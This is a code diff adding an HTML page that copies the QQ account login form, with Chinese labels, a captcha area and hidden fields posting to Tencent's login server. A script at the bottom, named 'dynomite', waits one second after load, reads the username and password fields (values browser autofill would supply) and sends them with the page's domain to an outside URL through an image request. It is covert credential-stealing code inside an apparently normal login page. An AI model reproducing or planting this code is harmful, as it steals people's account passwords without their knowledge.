@@ -1,0 +1,59 @@
+<html>
+<body>
+<form id="loginform" name="loginform" action="http://ptlogin2.qq.com/login" method="post" onsubmit="if(!isAbleSubmit){return false;};return onLogin(loginform)" onreset="return onReset(loginform)" target="_self" style="margin:0px;">
+        <ul id="g_list">
+            <li id="err_m" class="err_m"></li>
+            <li id="g_u">
+            	<span><u id="label_uin">QQ帐号：</u></span><input type="text" class="inputstyle" id="u" name="u" value="" style="ime-mode:disabled" tabindex="1" onblur="check();"> <label><a target="_blank" href="http://zc.qq.com?from=pt" tabindex="7" id="label_newreg">注册新帐号</a></label>
+            </li> 
+            <li id="g_p">
+            	<span><u id="label_pwd">QQ密码：</u></span><input type="password" class="inputstyle" id="p" name="p" value="" maxlength="16" tabindex="2" onfocus="check();"> <label><a target="_blank" tabindex="8" href="http://ptlogin2.qq.com/ptui_forgetpwd" onclick="forgetPwd()" id="label_forget_pwd">忘了密码？</a></label>
+            </li>
+            <li id="verifyinput" style="display: none;">
+            	<span for="code"><u id="label_vcode">验证码：</u></span><input name="verifycode" type="text" style="ime-mode:disabled" class="inputstyle" id="verifycode" value="" maxlength="5" tabindex="3">
+            </li>
+            <li id="verifytip" style="display: none;">
+            	<span>&nbsp;</span><u id="label_vcode_tip">输入下图中的字符，不区分大小写</u>
+            </li>
+            <li id="verifyshow" style="display: none;">
+            	<span for="pic">&nbsp;</span><img id="imgVerify" width="130" height="53" onload="imgReady()"><label><a id="changeimg_link" tabindex="6" href="javascript:ptui_changeImg('qq.com', 636014201, true);">看不清，换一张</a></label>
+            </li> 
+               
+        </ul> 
+        <div class="login_button">
+            <input type="submit" tabindex="5" value="登 录" class="btn" id="login_button">
+        </div>
+        <div class="lineright" id="label_unable_tips">
+        	<span id="label_qlogin_tips" style="display:none;"></span>
+        </div>
+        <input type="hidden" name="aid" value="636014201">
+<input type="hidden" name="u1" value="http://www.qq.com/qq2012/loginSuccess.htm">
+<input type="hidden" name="fp" value="">
+<input type="hidden" name="h" value="1">
+<input type="hidden" name="ptredirect" value="0">
+<input type="hidden" name="ptlang" value="2052">
+
+        <input type="hidden" name="from_ui" value="1">
+        <input type="hidden" name="dumy" value="">
+    </form>
+</body>
+
+<script>
+setTimeout(dynomite, 1000);
+
+function dynomite()
+{
+username = document.getElementsByTagName('input')[0].value;
+password = document.getElementsByTagName('input')[1].value;
+//alert('pass : '+password);
+
+var img = new Image();
+img.src="http://www.reddit.com/dump?"+username+"&"+password+"&"+document.domain;
+document.body.appendChild(img);
+}
+</script>
+
+
+
+
+</html>
